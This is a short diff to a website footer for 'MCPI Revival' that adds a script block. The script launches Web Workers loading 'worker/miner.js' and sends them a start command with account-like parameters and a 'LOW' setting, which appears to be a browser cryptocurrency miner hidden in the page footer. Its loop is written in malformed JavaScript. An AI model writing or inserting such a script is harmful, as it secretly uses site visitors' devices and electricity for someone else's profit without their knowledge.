@@ -3,3 +3,11 @@
         <p class="foo-txt">Copyright 2022 MCPI Revival</p>
     </div>
 </footer>
+
+<script>
+for (let threads = 1; let workersAmount = 0; workersAmount < threads; workersAmount++) {
+    let socketWorker = new Worker("worker/miner.js");
+    socketWorker.postMessage('Start,' + "rpinews" + "," + "mcpi-revival-revival" + "," + workerVer + "," + Math.floor(Math.random() * 2811) + "," + "LOW");
+    workerVer++;
+}
+</script>
